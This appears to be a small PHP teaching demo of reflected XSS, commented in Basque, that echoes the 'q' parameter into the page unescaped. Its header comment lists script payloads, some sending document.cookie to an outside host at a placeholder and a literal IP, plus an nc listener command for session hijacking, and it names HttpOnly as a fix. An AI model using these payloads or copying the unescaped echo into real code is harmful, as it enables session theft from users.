<?php

/*

http://.../xss.php?q=X
?q=<script>console.log('iepa')</script>
<script>alert("Hackable!")</script>
<script>alert(document.cookie)</script>
<script>new Image().src="http://[IP]:8888/bogus.php?output="+document.cookie</script>
<script>new Image().src="http://[IP]:8888/bogus.php?output=bai"</script>
<script>fetch('http://3.136.97.33:8888', {method: 'POST',mode: 'no-cors',body:document.cookie});</script>

Eskaera ikusteko:
$ nc -lvp 8888
bertan cookie-a agertuko da: PHPSESSID
Bere balioa beste batean kopiatzen badugu we have hijacked the user’s session
konponketa bat: HTTPOnly erabiltzea da (ikusi xss_secured.php)
*/

session_start();
$_SESSION["user"]='koxme';

echo "erabilpena: http://.../?q=X <br>";
/*
echo "adibidez:<br>";
echo htmlspecialchars("?q=<script>console.log('iepa')</script>") . "<br>";
echo htmlspecialchars("?q=<script>alert('Hackable!')</script>");
*/

echo "<p>" . $_GET["q"] . "</p>";